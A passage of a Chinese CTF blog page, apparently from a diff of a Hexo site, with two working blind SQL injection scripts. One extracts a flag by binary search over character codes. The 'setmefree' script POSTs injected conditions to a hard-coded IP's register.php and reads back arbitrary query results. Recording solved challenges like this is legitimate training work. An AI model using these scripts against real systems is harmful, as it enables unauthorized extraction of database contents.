&#123;&#125;),&#123;&#125;,1))&gt;&#123;&#125;)-- =&quot;\</span><br><span class="line">                .format(column,table,pos,m_bound)&#125;</span><br><span class="line">            res     = requests.get(_URL_, headers=header)</span><br><span class="line"></span><br><span class="line">            if getResponse(res.text):</span><br><span class="line">                l_bound = m_bound + 1</span><br><span class="line">            else:</span><br><span class="line">                u_bound = m_bound - 1</span><br><span class="line">                temp = m_bound</span><br><span class="line"></span><br><span class="line">        # do not know what this segment mean:</span><br><span class="line">        # if u_bound == 0:</span><br><span class="line">        #   break</span><br><span class="line">            </span><br><span class="line">        flag += chr(temp)</span><br><span class="line">        print &apos;FLAG:%s&apos; % (flag) </span><br><span class="line">        while &apos;&#125;&apos; in flag:</span><br><span class="line">            break</span><br><span class="line">        pos += 1</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    a = time.time()</span><br><span class="line">    BindSQLinjection(column,table)</span><br><span class="line">    print &apos;Time used:&apos;,time.time() - a</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<h2 id="setmefree"><a href="#setmefree" class="headerlink" title="setmefree"></a>setmefree</h2><p>dalao的脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">from urllib import request, parse</span><br><span class="line">import sys, math</span><br><span class="line"> </span><br><span class="line">def send(query):</span><br><span class="line"> </span><br><span class="line">    data = parse.urlencode(&#123; &apos;username&apos; : &quot;&apos;) and if((%s),1,0) #&quot; % query &#125;).encode()</span><br><span class="line">    #我那个时候的想法是-1&apos;) union select 1,(时间盲注语句),1; # 应该反思，明明可以用跟快捷的方法的</span><br><span class="line"></span><br><span class="line">    req = request.Request(&apos;http://3.16.68.122/smf/register.php&apos;, data = data)</span><br><span class="line">    req.get_method = lambda : &apos;POST&apos;</span><br><span class="line">    res = request.urlopen(req).read().decode()</span><br><span class="line">     </span><br><span class="line">    return res.find(&apos;User Not Registered&apos;) != -1; # means true</span><br><span class="line"> </span><br><span class="line">def greater_than_or_equal(query, i):</span><br><span class="line">    return send(&apos;%s &gt;= %d&apos; % (query, i));</span><br><span class="line">     </span><br><span class="line">def equal(query, i):</span><br><span class="line">    return send(&apos;%s = %d&apos; % (query, i));</span><br><span class="line"> </span><br><span class="line">def search(query):</span><br><span class="line">    min_val = 0</span><br><span class="line">    max_val = 128</span><br><span class="line">     </span><br><span class="line">    while min_val + 1 &lt; max_val:</span><br><span class="line">        mid = math.floor((min_val + max_val) / 2)</span><br><span class="line">        #这是何苦呢，本来除法就是向下取整的。不过秀还是很秀的</span><br><span class="line"></span><br><span class="line">        if greater_than_or_equal(query, mid):</span><br><span class="line">            min_val = mid</span><br><span class="line">        else:</span><br><span class="line">            max_val = mid</span><br><span class="line">            #这是ascii码大于等于都不成立的情况，也就是说mid不可能是正确结果，看起来好像是将正确结果逼向min_val</span><br><span class="line"></span><br><span class="line">    if not equal(query, min_val):</span><br><span class="line">        return search(query)</span><br><span class="line">        #如果找不到就再找一次</span><br><span class="line">     </span><br><span class="line">    return min_val</span><br><span class="line">     </span><br><span class="line">def get_length(query):</span><br><span class="line">    return search(&apos;length((%s))&apos; % query)</span><br><span class="line">     </span><br><span class="line">def get_and_print_content(query, length):</span><br><span class="line">    content = &apos;&apos;</span><br><span class="line">    for i in range(length):</span><br><span class="line">        content += chr(search(&apos;ord(substr((%s), %d, 1))&apos; % (query, i + 1)))</span><br><span class="line">        sys.stdout.write(&apos;\r[%s] %s%s&apos; % (length, content, &apos;_&apos; * (length - len(content))))</span><br><span class="line">    print(&apos;&apos;)</span><br><span class="line">    return content</span><br><span class="line"> </span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    arg = &apos; &apos;.join(sys.argv[1:])</span><br><span class="line">     </span><br><span class="line">    content_len = get_length(arg)</span><br><span class="line">    get_and_print_content(arg, content_len)</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/22/XXE-题型记录/" rel="next" title="XXE 题型记录">
+                <i class="fa fa-chevron-left"></i> XXE 题型记录
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/04/22/XSS-题型记录/" rel="prev" title="XSS 题型记录">
+                XSS 题型记录 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/40637063.jpg" alt="ch4ser">
+            
+              <p class="site-author-name" itemprop="name">ch4ser</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/ch4ser-go" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/ch4_ser" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#bugku-神奇登陆框"><span class="nav-number">1.</span> <span class="nav-text">bugku 神奇登陆框</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#多次"><span class="nav-number">2.</span> <span class="nav-text">多次</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql注入2"><span class="nav-number">3.</span> <span class="nav-text">sql注入2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu-SQL"><span class="nav-number">4.</span> <span class="nav-text">ichunqiu SQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shiyan-club-login-background"><span class="nav-number">5.</span> <span class="nav-text">shiyan-club login background</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shiyanbar-登陆一下好吗？"><span class="nav-number">6.</span> <span class="nav-text">shiyanbar 登陆一下好吗？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#md5注入"><span class="nav-number">7.</span> <span class="nav-text">md5注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cbc-字节翻转攻击注入"><span class="nav-number">8.</span> <span class="nav-text">cbc 字节翻转攻击注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实验吧的一道二分注入"><span class="nav-number">9.</span> <span class="nav-text">实验吧的一道二分注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2018xmas-的一道基于useragent的二分盲注"><span class="nav-number">10.</span> <span class="nav-text">2018xmas 的一道基于useragent的二分盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#setmefree"><span class="nav-number">11.</span> <span class="nav-text">setmefree</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_pv">
+        本站总访问量: <span id="busuanzi_value_site_pv"></span>次
+    </span>
+
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ch4ser</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
